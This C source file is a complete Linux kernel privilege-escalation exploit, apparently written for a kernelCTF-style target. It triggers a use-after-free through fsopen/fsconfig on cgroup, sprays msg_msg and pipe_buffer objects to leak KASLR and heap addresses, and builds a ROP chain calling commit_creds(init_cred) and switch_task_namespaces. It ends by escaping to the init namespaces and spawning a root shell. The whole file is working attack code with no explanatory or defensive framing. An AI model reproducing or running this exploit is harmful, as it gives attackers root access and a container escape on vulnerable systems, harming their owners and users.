#define _GNU_SOURCE

#include <endian.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#include <assert.h>
#include <pthread.h>
#include <sys/uio.h>
#include <x86intrin.h>

#include <err.h>

#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>

#include <linux/capability.h>

void DumpHex(const void *data, size_t size) {
  char ascii[17];
  size_t i, j;
  ascii[16] = '\0';
  for (i = 0; i < size; ++i) {
    printf("%02X ", ((unsigned char *)data)[i]);
    if (((unsigned char *)data)[i] >= ' ' &&
        ((unsigned char *)data)[i] <= '~') {
      ascii[i % 16] = ((unsigned char *)data)[i];
    } else {
      ascii[i % 16] = '.';
    }
    if ((i + 1) % 8 == 0 || i + 1 == size) {
      printf(" ");
      if ((i + 1) % 16 == 0) {
        printf("|  %s \n", ascii);
      } else if (i + 1 == size) {
        ascii[(i + 1) % 16] = '\0';
        if ((i + 1) % 16 <= 8) {
          printf(" ");
        }
        for (j = (i + 1) % 16; j < 16; ++j) {
          printf("   ");
        }
        printf("|  %s \n", ascii);
      }
    }
  }
}

void pin_on_cpu(int cpu) {
  cpu_set_t cpu_set;
  CPU_ZERO(&cpu_set);
  CPU_SET(cpu, &cpu_set);
  if (sched_setaffinity(0, sizeof(cpu_set), &cpu_set) != 0) {
    perror("sched_setaffinity()");
    exit(EXIT_FAILURE);
  }
  usleep(1000);
}

static void die(const char *fmt, ...) {
  va_list params;

  va_start(params, fmt);
  vfprintf(stderr, fmt, params);
  va_end(params);
  exit(1);
}

static void use_temporary_dir(void) {
  system("rm -rf exp_dir; mkdir exp_dir; touch exp_dir/data;");
  char *tmpdir = "exp_dir";
  if (!tmpdir)
    exit(1);
  if (chmod(tmpdir, 0777))
    exit(1);
  if (chdir(tmpdir))
    exit(1);
}

static bool write_file(const char *file, const char *what, ...) {
  char buf[1024];
  va_list args;
  va_start(args, what);
  vsnprintf(buf, sizeof(buf), what, args);
  va_end(args);
  buf[sizeof(buf) - 1] = 0;
  int len = strlen(buf);
  int fd = open(file, O_WRONLY | O_CLOEXEC);
  if (fd == -1)
    return false;
  if (write(fd, buf, len) != len) {
    int err = errno;
    close(fd);
    errno = err;
    return false;
  }
  close(fd);
  return true;
}

static void setup_common() {
  if (mount(0, "/sys/fs/fuse/connections", "fusectl", 0, 0)) {
  }
}

static void loop();

static void sandbox_common() {
  prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
  setsid();
  struct rlimit rlim;
  rlim.rlim_cur = rlim.rlim_max = (200 << 20);
  setrlimit(RLIMIT_AS, &rlim);
  rlim.rlim_cur = rlim.rlim_max = 32 << 20;
  setrlimit(RLIMIT_MEMLOCK, &rlim);
  rlim.rlim_cur = rlim.rlim_max = 136 << 20;
  setrlimit(RLIMIT_FSIZE, &rlim);
  rlim.rlim_cur = rlim.rlim_max = 1 << 20;
  setrlimit(RLIMIT_STACK, &rlim);
  rlim.rlim_cur = rlim.rlim_max = 0;
  setrlimit(RLIMIT_CORE, &rlim);
  rlim.rlim_cur = rlim.rlim_max = 0x8000;
  setrlimit(RLIMIT_NOFILE, &rlim);
  if (unshare(CLONE_NEWNS)) {
  }
  typedef struct {
    const char *name;
    const char *value;
  } sysctl_t;
  static const sysctl_t sysctls[] = {
      {"/proc/sys/kernel/shmmax", "16777216"},
      {"/proc/sys/kernel/shmall", "536870912"},
      {"/proc/sys/kernel/shmmni", "1024"},
      {"/proc/sys/kernel/msgmax", "0x8000"},
      {"/proc/sys/kernel/msgmni", "1024"},
      {"/proc/sys/kernel/msgmnb", "1024"},
      {"/proc/sys/kernel/sem", "1024 1048576 500 1024"},
  };
  unsigned i;
  for (i = 0; i < sizeof(sysctls) / sizeof(sysctls[0]); i++)
    write_file(sysctls[i].name, sysctls[i].value);
}

static int wait_for_loop(int pid) {
  if (pid < 0)
    exit(1);
  int status = 0;
  while (waitpid(-1, &status, __WALL) != pid) {
  }
  return WEXITSTATUS(status);
}

static void drop_caps(void) {
  struct __user_cap_header_struct cap_hdr = {};
  struct __user_cap_data_struct cap_data[2] = {};
  cap_hdr.version = _LINUX_CAPABILITY_VERSION_3;
  cap_hdr.pid = getpid();
  if (syscall(SYS_capget, &cap_hdr, &cap_data))
    exit(1);
  const int drop = (1 << CAP_SYS_PTRACE) | (1 << CAP_SYS_NICE);
  cap_data[0].effective &= ~drop;
  cap_data[0].permitted &= ~drop;
  cap_data[0].inheritable &= ~drop;
  if (syscall(SYS_capset, &cap_hdr, &cap_data))
    exit(1);
}

static int real_uid;
static int real_gid;
__attribute__((aligned(64 << 10))) static char sandbox_stack[1 << 20];

static void pre_exploit();
static void exploit();
void functionA () {
   printf("This is functionA\n");
}
static int namespace_sandbox_proc() {

  atexit(functionA);
  sandbox_common();
  pre_exploit();
  exploit();
  exit(1);
}

static int do_sandbox_namespace() {
  setup_common();
  real_uid = getuid();
  real_gid = getgid();
  mprotect(sandbox_stack, 4096, PROT_NONE);

  int pid =
      clone(namespace_sandbox_proc, &sandbox_stack[sizeof(sandbox_stack) - 64], CLONE_NEWUSER, 0);
  return wait_for_loop(pid);
}

// ===========================

#ifndef __NR_fsconfig
#define __NR_fsconfig 431
#endif
#ifndef __NR_fsopen
#define __NR_fsopen 430
#endif

#define MAX_FILE_NUM 10000
#define MAX_MSG_SPRAY 800
#define MAX_PIPE_NUM 100

int uaf_fd;
int fs_fd_1, fs_fd_2, fs_fd_3;

unsigned long kaslr_offset;

int fds[MAX_FILE_NUM];
int msg_ids[MAX_FILE_NUM];
int pipes[2*MAX_PIPE_NUM][2];

/* spray 256 */
struct msg {
  long mtype;
  char data[];
};

void setup_uaf() {
  fs_fd_1 = syscall(__NR_fsopen, "cgroup", 0);
  if (fs_fd_1 < 0) {
    perror("fsopen");
    die("");
  }

  fs_fd_2 = syscall(__NR_fsopen, "cgroup", 0);
  if (fs_fd_2 < 0) {
    perror("fsopen");
    die("");
  }

  // fs_fd_3 = syscall(__NR_fsopen, "cgroup", 0);
  // if (fs_fd_3 < 0) {
  //   perror("fsopen");
  //   die("");
  // }
}

void set_uaffd() {
  if (uaf_fd < 0) {
    die("failed to open uaf file\n");
  }
  printf("opened uaf fd: %d\n", uaf_fd);

  if (syscall(__NR_fsconfig, fs_fd_1, 5, "source", 0, uaf_fd)) {
    perror("fsconfig");
    exit(-1);
  }

  if (syscall(__NR_fsconfig, fs_fd_2, 5, "source", 0, uaf_fd)) {
    perror("fsconfig");
    exit(-1);
  }

  // if (syscall(__NR_fsconfig, fs_fd_3, 5, "source", 0, uaf_fd)) {
  //   perror("fsconfig");
  //   exit(-1);
  // }
}

int do_exp(void) {
  syscall(__NR_mmap, 0x1ffff000ul, 0x1000ul, 0ul, 0x32ul, -1, 0ul);
  syscall(__NR_mmap, 0x20000000ul, 0x1000000ul, 7ul, 0x32ul, -1, 0ul);
  syscall(__NR_mmap, 0x21000000ul, 0x1000ul, 0ul, 0x32ul, -1, 0ul);
  do_sandbox_namespace();
  return 0;
}


static void pre_exploit() {
  struct rlimit old_lim;

  // pin_on_cpu(0);

  if(getrlimit(RLIMIT_NOFILE, &old_lim) == 0)
    printf("Old limits -> soft limit= %ld \t"
          " hard limit= %ld \n", old_lim.rlim_cur,
                               old_lim.rlim_max);

  for (int i=0; i<MAX_MSG_SPRAY+200; i++) {
    msg_ids[i] = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
    if (msg_ids[i] < 0) {
      err(1, "msgget");
    }
  }

  int pid = fork();
  if (pid<0) err(1, "fork");
  if (pid) {
    while(1) {
      sleep(1000000);
    }
  }

  for (int i=0; i<2*MAX_PIPE_NUM; i++) {
    if (pipe(pipes[i]) < 0) {
      err(1, "pipe");
    }
  }

}

void msg_recv(int msqid, int msg_type, char *data, size_t size) {
  if(msgrcv(msqid, data, size, msg_type, MSG_NOERROR | IPC_NOWAIT | MSG_COPY) < 0) {
    perror("msgrcv");
    exit(-1);
  }
}

void msg_free(int msqid, int msg_type, char *data, size_t size) {
  if(msgrcv(msqid, data, size, msg_type, 0) < 0) {
    perror("msgrcv");
  }
}

void vsleep(int n) {
  while(n--) {
    printf("sleep %d\n", n+1);
    sleep(1);
  }
}

static void exploit() {
  char data[0x2000] = {};
  struct msg *m = (struct msg*)data;
  int time;
  m->mtype = 1;
  pin_on_cpu(3);

  // step 1: prepare uaf context
  setup_uaf();

  // step 2: spray files, including uaf file
  printf("spraying files\n");
  // defragment
  for (int i=0; i<MAX_FILE_NUM/2; i++) {
    fds[i] = open("./data", O_RDONLY);
    if (fds[i] < 0) {
      err(1, "open data");
    }
  }
  uaf_fd = open("./data", O_RDONLY);

  // slab size for file : 0x1000
  // 0x1000/0x140 = 12

  for (int i=0; i<MAX_FILE_NUM/2; i++) {
    fds[MAX_FILE_NUM/2+i] = open("./data", O_RDONLY);
    if (fds[MAX_FILE_NUM/2+i] < 0) {
      err(1, "open data 2");
    }
  }

  set_uaffd();

  printf("start free files\n");
  // step 3: free files, should free the file slab
  // make sure we will free a least one slab page
  close(uaf_fd); // remove the uaf fd to prevent crash
  for (int i=0; i<400; i++) {
    close(fds[MAX_FILE_NUM/2-200+i]);
  }
  close(fs_fd_1);
  sleep(1);

  // step 3: spray msg 512 for 4 core cpu
  for (int i=0; i<MAX_MSG_SPRAY; i++) {
    memset(m->data, 'A', 0x1800);
    if (msgsnd(msg_ids[i], (void *)m, 0x1000+0x200-48-8, 0) != 0) {
      err(1, "msgsnd");
    }
  }

  printf("spray msg done, now free the msg\n");
  // step 4: now free the file object through fs_context
  // indeed, it frees msg
  close(fs_fd_2);
  sleep(1);
  printf("freed msg\n");
  // getchar();
  // sleep(3);
  // getchar();
  // step 5: we should be able to find the msg freed now
  char leak[0x2000];
  unsigned long slab_rand = 0;
  int msg_id = -1;
  int leak_offset = 0;
  // printf("now leaking...\n");
  for (int j=0; j<MAX_MSG_SPRAY; j++) {
    // printf("%d\n", j);
    // vsleep(1);
    memset(leak, 0, 0x2000);
    // set a larger value to prevent allocate in the freed memory
    msg_recv(msg_ids[j], 0, leak, 0x1400-48-8);
    for (int i=0x10; i<0x1200-48-8-0x10; i+=8) {
      if (*(unsigned long int*)(leak+i) != 0x4141414141414141) {
        printf("we got a leak at %x\n", i);
        leak_offset = i;
        printf("leaked value : %lx\n", *(unsigned long int*)(leak+i));
        slab_rand = *(unsigned long int*)(leak+i);
        msg_id = j;
        DumpHex(leak+i, 0x100);
        break;
      }
    }

    if (slab_rand) {
      break;
    }
  }

  if (!slab_rand) {
    printf("no luck, try again\n");
    getchar();
    exit(-1);
  }
  printf("leak done\n");
  if (leak_offset <= 0x1000) {
    printf("likely to fail\n");
    getchar();
    exit(-1);
  }
  // getchar();
  // step 6: now spray pipe to get a kaslr leak
  for (int i=0; i<MAX_PIPE_NUM; i++) {
    // 8*40 = 320 > 256
    fcntl(pipes[i][1], F_SETPIPE_SZ, 0x8000);
  }

  // init pipe_buffer
  for (int i=0; i<MAX_PIPE_NUM; i++) {
    write(pipes[i][1], "KCTF", 4);
  }

  // step 7, now, let's leak ops
  memset(leak, 0, 0x2000);
  unsigned long *pipe_buffer = 0;
  unsigned long pipe_ops = 0;
  unsigned long pipe_page = 0; 
  msg_recv(msg_ids[msg_id], 0, leak, 0x1400-48-8);
  pipe_ops = *(unsigned long int*)(leak+0x10+leak_offset);
  pipe_page = *(unsigned long int*)(leak+leak_offset);
  DumpHex(leak+leak_offset, 0x20);

  kaslr_offset = pipe_ops - 0xffffffff81e3ce40;
  printf("kaslr offset : %lx\n", kaslr_offset);
  printf("found pipe ops at: 0x%lx\n", pipe_ops);
  printf("foudn page at: 0x%lx\n", pipe_page);
  msg_free(msg_ids[msg_id+1], 1, leak, 0x1200-48-8);

  unsigned long int heap = 0;
  unsigned long int heap_rand = 0;
  int pipe_victim_idx = -1;
  for (int j=0; j<MAX_PIPE_NUM; j++) {
    // free buffer
    // printf("%d\n", j);
    fcntl(pipes[j][1], F_SETPIPE_SZ, 0xa000);
    memset(leak, 0, 0x1200);
    msg_recv(msg_ids[msg_id], 0, leak, 0x1400-48-8);

    heap_rand = *(unsigned long int*)(leak+leak_offset);
    if (heap_rand && heap_rand != pipe_page) {
      printf("heap rand: %lx\n", heap_rand);
      heap = heap_rand ^ slab_rand;
      printf("found heap addr : 0x%lx\n", heap);
      break;
    }
    pipe_victim_idx = j;
  }

  assert(heap);

  printf("leak done\n");
  // getchar();

  // spray msg a little bit to put payload there
  memset(m->data, 0, 0x1800);

  for (int j=MAX_PIPE_NUM; j<MAX_PIPE_NUM*2; j++) {
    // printf("%d\n", j);
    pipe_victim_idx = j;
    int stop = 0;
    fcntl(pipes[j][1], F_SETPIPE_SZ, 0x8000);
    memset(leak, 0, 0x1400);
    msg_recv(msg_ids[msg_id], 0, leak, 0x1400-48-8);
    for (int i=0; i<0x1200-48-8-0x10; i+=8) {
      
      if (*(unsigned long int*)(leak+0x10+i) != 0x4141414141414141) {
        if (heap_rand != *(unsigned long int*)(leak+0x10+i)) {
          printf("stop spraying\n");
          stop = 1;
        }
        // DumpHex(leak+i, 0x30);
        break;
      }
    }
    if (stop) break;
  }

  write(pipes[pipe_victim_idx][1], "KCTF", 4);
  printf("pipe on again\n");
  // getchar();

  int pid = getpid();

  // now we spray memory on known heap

  // llseek --> arb read
  // read --> arb write

  // ops which is rdx
  memset(m->data, 0, 0x1800);
  unsigned long int *ops = (unsigned long int*)(m->data+0x1000-48);
  *ops++ = 0xffffffff811004c3 + kaslr_offset; // : push rsi ; jmp qword ptr [rsi + 0x2e]
  *ops++ = 0xffffffff811004c3 + kaslr_offset; // : push rsi ; jmp qword ptr [rsi + 0x2e]
  *ops++ = 0xffffffff811004c3 + kaslr_offset; // : push rsi ; jmp qword ptr [rsi + 0x2e]
  // 0xffffffff81c03275 : push rsi ; jmp qword ptr [rsi + 0x56]
  // start rop here

  // *(unsigned long int*)(m->data+0x1000-48+0x46) = 0xffffffff81218967; // pop rsp ; add eax, 0x83480000 ; ret
  // *(unsigned long int*)(m->data+0x1000-48-8+0x46) = 0xffffffff81218967; // pop rsp ; add eax, 0x83480000 ; ret

  unsigned long int *rop = (unsigned long int*)(m->data+0x1000-48-8+0x20);
  *rop++ = 0xffffffff816fa405 + kaslr_offset; // enter 0,0; push rbp; mov ebp, esp;
  *rop++ = heap+0x180; // r14, store rbp
  *rop++ = 0xdeadbeef; // rbp
  // move rbp to heap;
  *rop++ = 0xffffffff81503f78 + kaslr_offset; // mov qword ptr [r14], rbx ; pop rbx ; pop r14 ; pop rbp ; ret
  *rop++ = 0xdeadbeef;
  *rop++ = 0xdeadbeef;
  *rop++ = 0xdeadbeef;

  // commit_creds(init_cred)
  *rop++ = 0xffffffff81067a60 + kaslr_offset; // pop rdi

  // *rop++ = 0;
  // *rop++ = 0xffffffff8109f330 + kaslr_offset; // prepare kernel cred
  // *rop++ = 0xffffffff8108d212 + kaslr_offset; // pop rdx
  // *rop++ = 1;
  // *rop++ = 0xffffffff8154e861 + kaslr_offset; // cmp rdx, 1 ; jne 0xffffffff8154e89d ; pop rbp ; ret
  // *rop++ = 0xdeadbeef; // rbp
  // *rop++ = 0xffffffff8123cb26 + kaslr_offset; // mov rdi, rax ; jne 0xffffffff8123cb16 ; pop rbp ; ret
  // *rop++ = 0xdeadbeef; // rbp

  *rop++ = 0xffffffff82250950 + kaslr_offset; // init_cred
  *rop++ = 0xffffffff8109ed70 + kaslr_offset; // commit_creds

  // 0xffffffff82219700 init_task
  // 0xffffffff82250580 init_ns

  // switch context
  *rop++ = 0xffffffff81067a60 + kaslr_offset;
  *rop++ = 1;
  *rop++ = 0xffffffff810963e0 + kaslr_offset; // find_task_by_vpid
  *rop++ = 0xffffffff8108d212 + kaslr_offset; // pop rdx
  *rop++ = 1;
  *rop++ = 0xffffffff8154e861 + kaslr_offset; // cmp rdx, 1 ; jne 0xffffffff8154e89d ; pop rbp ; ret
  *rop++ = 0xdeadbeef; // rbp
  *rop++ = 0xffffffff8123cb26 + kaslr_offset; // mov rdi, rax ; jne 0xffffffff8123cb16 ; pop rbp ; ret
  *rop++ = 0xdeadbeef; // rbp
  *rop++ = 0xffffffff8105d30f + kaslr_offset; // pop rsi ; ret
  *rop++ = 0xffffffff82250580 + kaslr_offset; // init_nsproxy
  *rop++ = 0xffffffff8109d1a0 + kaslr_offset; // switch_task_namespaces

  // return execution
  *rop++ = 0xffffffff81000571 + kaslr_offset; // pop rbp
  *rop++ = heap+0x180+0x10;
  *rop++ = 0xffffffff8123e2cd + kaslr_offset; // : push qword ptr [rbp - 0x10] ; pop rbp ; ret
  *rop++ = 0xffffffff810679cc + kaslr_offset; // : mov rsp, rbp ; pop rbp ; ret



  // spray ops
  for (int i=MAX_MSG_SPRAY; i<MAX_MSG_SPRAY+100; i++) {
    if (msgsnd(msg_ids[i], (void *)m, 0x1000+0x200-48-8, 0) != 0) {
      err(1, "msgsnd");
    }
  }

  // ffffffff81298fd0 free_pipe_info
  // 0xffffffff81299049 call r11

  
  // arb read
  // 0xffffffff8104f385 : mov rax, qword ptr [rsi + 0x18] ; ret

  // cos
  // 0xffffffff810239b1 : mov eax, dword ptr [rsi - 0x38b7fffb] ; ret

  // arb write
  // 0xffffffff8116005b : mov qword ptr [rsi], rdx ; ret
  // 0xffffffff81ab62f8 : mov dword ptr [rdx], esi ; ret

  // *payload++ = 
  // ops == known_heap
  // rdx is the ops == 0
  // rax == pipe_buffer+0x10 == 0

  // rcx == rsi == the pipe_buffer { page, 8 byte, ops}
  // 0xffffffff8108b6b7 : jmp qword ptr [rdx]
  // 0xffffffff826c61b7 : jmp qword ptr [rdx + 0x23]
  // 0xffffffff81feff8e : push rcx ; jmp qword ptr [rdx + 0x46]
  // 0xffffffff811004c3 : push rsi ; jmp qword ptr [rsi + 0x2e]

  // 0xffffffff81218967 : pop rsp ; add eax, 0x83480000 ; ret
  // 0xffffffff816fa405 : enter 0, 0 ; pop rbx ; pop r14 ; pop rbp ; ret
  // 0xffffffff81503f78 : mov qword ptr [r14], rbx ; pop rbx ; pop r14 ; pop rbp ; ret

  // 0xffffffff81067a60 : pop rdi ; ret
  // 0xffffffff8108d212 : pop rdx ; ret

  // 0xffffffff81000571 : pop rbp ; ret
  // 0xffffffff8123e2cd : push qword ptr [rbp - 0x10] ; pop rbp ; ret
  // 0xffffffff810679cc : mov rsp, rbp ; pop rbp ; ret

  // 0xffffffff8154e861 : cmp rdx, 1 ; jne 0xffffffff8154e89d ; pop rbp ; ret
  // 0xffffffff810566ac : pop rcx ; ret
  // 0xffffffff8123cb26 : mov rdi, rax ; jne 0xffffffff8123cb16 ; pop rbp ; ret
  // 0xffffffff8105d30f : pop rsi ; ret

  // hijack ops
  msg_free(msg_ids[msg_id], 1, leak, 0x1200-48-8);
  // make fcount == 0 preventing crash.
  memset(m->data, 0, 0x1800);
  unsigned long int *payload = (unsigned long int *)(m->data+0x1000-48);
  *(unsigned long int*)(m->data + leak_offset-8) = 0xffffffff810c7fbe + kaslr_offset; // : pop rsp ; ret; // rsp // page
  *(unsigned long int*)(m->data + leak_offset)   = heap+0x20; // offset
  *(unsigned long int*)(m->data + leak_offset+8) = heap; // ops

  *(unsigned long int*)(m->data + leak_offset-8+0x28) = heap+0x100; // ops

  *(unsigned long int*)(m->data + leak_offset-8+0x2e) = 0xffffffff81218967 + kaslr_offset; // pop rsp ; add eax, 0x83480000 ; ret

  for (int i=MAX_MSG_SPRAY+100; i<MAX_MSG_SPRAY+200; i++) {
    if (msgsnd(msg_ids[i], (void *)m, 0x1000+0x200-48-8, 0) != 0) {
      err(1, "msgsnd");
    }
  }

  printf("done, hijacking\n");
  // getchar();
  close(pipes[pipe_victim_idx][1]);
  close(pipes[pipe_victim_idx][0]);

  if (setns(open("/proc/1/ns/mnt", O_RDONLY), 0) < 0) {
    perror("setns 1\n");
  }
  if (setns(open("/proc/1/ns/pid", O_RDONLY), 0) < 0) {
    perror("setns 2\n");
    setns(open("/proc/1/ns/pid", O_RDONLY), 0);
  }
  char *args[] = {"/bin/bash", "-i", NULL};
  execve(args[0], args, NULL);
  printf("exit...\n");
  getchar();
}




int main(void) {
  use_temporary_dir();
  do_exp();
}
